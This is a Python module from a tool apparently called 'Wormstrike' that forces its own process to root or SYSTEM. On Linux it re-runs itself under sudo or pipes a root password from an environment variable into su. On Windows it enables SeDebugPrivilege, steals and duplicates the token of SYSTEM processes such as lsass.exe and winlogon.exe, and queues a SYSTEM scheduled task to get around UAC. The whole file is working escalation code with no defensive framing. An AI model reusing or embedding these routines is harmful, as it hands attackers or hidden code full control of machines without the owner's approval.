import os
import sys
import platform


def is_admin() -> bool:
    system = platform.system()
    if system == 'Windows':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    else:
        return os.getuid() == 0


def is_headless() -> bool:
    """
    True when there is no interactive user session — i.e. stdin is not a TTY.
    In this state, UAC dialogs cannot be shown or clicked and will hang forever.
    """
    return not (hasattr(sys.stdin, 'isatty') and sys.stdin.isatty())


def ensure_privileges():
    if is_admin():
        return

    system = platform.system()
    print('[!] Not running with elevated privileges. Attempting escalation...')

    if system == 'Windows':
        _escalate_windows()
    else:
        _escalate_linux()


# ── Linux escalation ──────────────────────────────────────────────────────

def _escalate_linux():
    """
    Escalation chain (tried in order):

    1. sudo re-exec — passwordless or TTY-interactive sudo.
       Skipped in headless mode when sudo would hang waiting for a password.

    2. su -c re-exec — if a root password is available in the environment
       variable WORMSTRIKE_ROOT_PASS, try su as a fallback.

    3. Give up with a helpful message.
    """
    import shutil

    headless = is_headless()
    sudo_path = shutil.which('sudo')

    if sudo_path:
        if headless:
            # Check if sudo will work without a password before committing
            import subprocess
            probe = subprocess.run(['sudo', '-n', 'true'], capture_output=True).returncode
            if probe == 0:
                print('[*] sudo NOPASSWD available — re-execing...')
                os.execvp('sudo', ['sudo', sys.executable] + sys.argv)
            else:
                print('[*] sudo requires a password and stdin is not a TTY — skipping sudo.')
        else:
            # Interactive: let sudo prompt for a password normally
            print('[*] Re-execing under sudo...')
            os.execvp('sudo', ['sudo', sys.executable] + sys.argv)
    else:
        print('[*] sudo not found.')

    # Fallback: su -c with root password from environment
    root_pass = os.environ.get('WORMSTRIKE_ROOT_PASS')
    if root_pass:
        import shlex
        args_str = ' '.join(shlex.quote(a) for a in sys.argv)
        cmd = f'{shlex.quote(sys.executable)} {args_str}'
        print('[*] Attempting su -c re-exec...')
        # Pass root password via stdin to su
        os.execlp('sh', 'sh', '-c',
                  f'echo {shlex.quote(root_pass)} | su -c {shlex.quote(cmd)} root')

    print('[!] Could not escalate to root.')
    print('[!] Run as root directly, configure NOPASSWD sudo, or set WORMSTRIKE_ROOT_PASS.')
    sys.exit(1)


# ── Windows escalation ────────────────────────────────────────────────────

def _escalate_windows():
    """
    Escalation chain (tried in order):

    1. Token duplication — steal the token of an already-elevated process
       (e.g. a running Windows service).  No UAC prompt, no user needed.
       Works if we can open any SYSTEM/elevated process handle.

    2. Scheduled task as SYSTEM — create a one-shot schtask, run it, output
       redirected to a log file.  Works without UAC if the current user is a
       local admin (even non-elevated).  Parent process exits after queuing.

    3. UAC ShellExecute runas — interactive only.  Skipped in headless mode
       because the dialog will never be answered.
    """
    if _try_token_duplication():
        return  # new elevated process launched, current one exits below

    if _try_schtask_system():
        return  # task queued, current one exits

    if is_headless():
        print('[!] Headless mode: no interactive user to approve UAC.')
        print('[!] Run as SYSTEM (via service/GPO/RMM) or pre-elevate the process.')
        sys.exit(1)

    # Interactive fallback — show UAC prompt
    _uac_shellexecute()


def _try_token_duplication() -> bool:
    """
    Duplicate the primary token of a SYSTEM or elevated process and launch a
    new instance of this tool under that token.  Returns True and exits the
    current process if successful.

    Requires SeDebugPrivilege or the ability to open at least one elevated
    process (e.g. services.exe, winlogon.exe, lsass.exe are common targets).
    """
    import ctypes
    import ctypes.wintypes as W

    PROCESS_QUERY_INFORMATION = 0x0400
    TOKEN_DUPLICATE            = 0x0002
    TOKEN_QUERY                = 0x0008
    TOKEN_ASSIGN_PRIMARY       = 0x0001
    TOKEN_ALL_ACCESS           = 0xF01FF
    SecurityImpersonation      = 2
    TokenPrimary               = 1
    CREATE_NEW_CONSOLE         = 0x00000010
    NORMAL_PRIORITY_CLASS      = 0x00000020

    k32  = ctypes.windll.kernel32
    adv  = ctypes.windll.advapi32

    # Enable SeDebugPrivilege so we can open protected processes
    _enable_sedebug()

    # Candidate processes that are reliably running as SYSTEM/elevated
    candidate_names = ['services.exe', 'winlogon.exe', 'lsass.exe', 'svchost.exe']
    elevated_pid = _find_elevated_pid(candidate_names)
    if not elevated_pid:
        print('[*] Token duplication: no suitable elevated process found.')
        return False

    h_proc = k32.OpenProcess(PROCESS_QUERY_INFORMATION, False, elevated_pid)
    if not h_proc:
        return False

    h_tok = W.HANDLE()
    if not adv.OpenProcessToken(h_proc, TOKEN_DUPLICATE | TOKEN_QUERY, ctypes.byref(h_tok)):
        k32.CloseHandle(h_proc)
        return False

    h_new_tok = W.HANDLE()
    if not adv.DuplicateTokenEx(
        h_tok, TOKEN_ALL_ACCESS, None,
        SecurityImpersonation, TokenPrimary,
        ctypes.byref(h_new_tok)
    ):
        k32.CloseHandle(h_tok)
        k32.CloseHandle(h_proc)
        return False

    # Launch a new process under the duplicated token
    args = ' '.join(f'"{a}"' if ' ' in a else a for a in sys.argv)
    cmd  = f'"{sys.executable}" {args}'

    si = _STARTUPINFO()
    si.cb = ctypes.sizeof(si)
    pi = _PROCESS_INFORMATION()

    ok = adv.CreateProcessWithTokenW(
        h_new_tok,
        0,           # logon flags
        None,        # application name
        cmd,         # command line
        CREATE_NEW_CONSOLE,
        None,        # environment
        None,        # current directory
        ctypes.byref(si),
        ctypes.byref(pi),
    )

    k32.CloseHandle(h_new_tok)
    k32.CloseHandle(h_tok)
    k32.CloseHandle(h_proc)

    if ok:
        print(f'[+] Elevated process launched via token duplication (PID {pi.dwProcessId}).')
        k32.CloseHandle(pi.hProcess)
        k32.CloseHandle(pi.hThread)
        sys.exit(0)

    return False


def _find_elevated_pid(names: list) -> int:
    """Return the PID of the first running process whose name is in the list."""
    import subprocess
    for name in names:
        result = subprocess.run(
            ['tasklist', '/FI', f'IMAGENAME eq {name}', '/FO', 'CSV', '/NH'],
            capture_output=True, text=True
        )
        for line in result.stdout.splitlines():
            parts = line.strip().strip('"').split('","')
            if len(parts) >= 2:
                try:
                    return int(parts[1])
                except ValueError:
                    continue
    return 0


def _enable_sedebug():
    """Best-effort attempt to enable SeDebugPrivilege on the current process."""
    try:
        import ctypes
        import ctypes.wintypes as W

        TOKEN_ADJUST_PRIVILEGES = 0x0020
        TOKEN_QUERY             = 0x0008
        SE_PRIVILEGE_ENABLED    = 0x00000002

        adv = ctypes.windll.advapi32
        k32 = ctypes.windll.kernel32

        h_tok = W.HANDLE()
        adv.OpenProcessToken(
            k32.GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            ctypes.byref(h_tok)
        )

        luid = _LUID()
        adv.LookupPrivilegeValueW(None, 'SeDebugPrivilege', ctypes.byref(luid))

        tp = _TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

        adv.AdjustTokenPrivileges(h_tok, False, ctypes.byref(tp), 0, None, None)
        k32.CloseHandle(h_tok)
    except Exception:
        pass  # Best effort — proceed without it


def _try_schtask_system() -> bool:
    """
    Create a one-shot scheduled task that runs this script as SYSTEM.
    Output is redirected to a log file next to main.py.
    Returns True and exits the current process if the task was queued.

    Works without UAC interaction when the current user is a local admin
    (standard UAC split-token scenario).
    """
    import subprocess
    import tempfile

    task_name = 'WormstrikeElevate'
    log_path  = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), 'wormstrike.log')
    args      = ' '.join(f'"{a}"' if ' ' in a else a for a in sys.argv[1:])
    cmd       = f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}" {args} >> "{log_path}" 2>&1'

    # Create task
    create = subprocess.run([
        'schtasks', '/create', '/f',
        '/tn', task_name,
        '/sc', 'once',
        '/st', '00:00',
        '/ru', 'SYSTEM',
        '/tr', cmd,
    ], capture_output=True, text=True)

    if create.returncode != 0:
        print(f'[*] Scheduled task creation failed: {create.stderr.strip()}')
        return False

    # Run it immediately
    subprocess.run(['schtasks', '/run', '/tn', task_name], capture_output=True)

    # Tidy up (best effort — task auto-deletes after one run anyway)
    subprocess.run(['schtasks', '/delete', '/f', '/tn', task_name], capture_output=True)

    print(f'[+] Escalated via scheduled task (SYSTEM). Output → {log_path}')
    sys.exit(0)


def _uac_shellexecute():
    """Interactive UAC elevation via ShellExecute runas. Requires a logged-in user."""
    import ctypes
    params = ' '.join(f'"{a}"' if ' ' in a else a for a in sys.argv)
    ret = ctypes.windll.shell32.ShellExecuteW(
        None, 'runas', sys.executable, params, None, 1
    )
    if ret <= 32:
        print(f'[!] UAC elevation failed (code {ret}). Run as Administrator.')
        sys.exit(1)
    sys.exit(0)


# ── ctypes structures ─────────────────────────────────────────────────────

import ctypes
import ctypes.wintypes as W

class _LUID(ctypes.Structure):
    _fields_ = [('LowPart', W.DWORD), ('HighPart', W.LONG)]

class _LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [('Luid', _LUID), ('Attributes', W.DWORD)]

class _TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [('PrivilegeCount', W.DWORD), ('Privileges', _LUID_AND_ATTRIBUTES * 1)]

class _STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ('cb',              W.DWORD),
        ('lpReserved',      W.LPWSTR),
        ('lpDesktop',       W.LPWSTR),
        ('lpTitle',         W.LPWSTR),
        ('dwX',             W.DWORD),
        ('dwY',             W.DWORD),
        ('dwXSize',         W.DWORD),
        ('dwYSize',         W.DWORD),
        ('dwXCountChars',   W.DWORD),
        ('dwYCountChars',   W.DWORD),
        ('dwFillAttribute', W.DWORD),
        ('dwFlags',         W.DWORD),
        ('wShowWindow',     W.WORD),
        ('cbReserved2',     W.WORD),
        ('lpReserved2',     ctypes.c_char_p),
        ('hStdInput',       W.HANDLE),
        ('hStdOutput',      W.HANDLE),
        ('hStdError',       W.HANDLE),
    ]

class _PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('hProcess',    W.HANDLE),
        ('hThread',     W.HANDLE),
        ('dwProcessId', W.DWORD),
        ('dwThreadId',  W.DWORD),
    ]
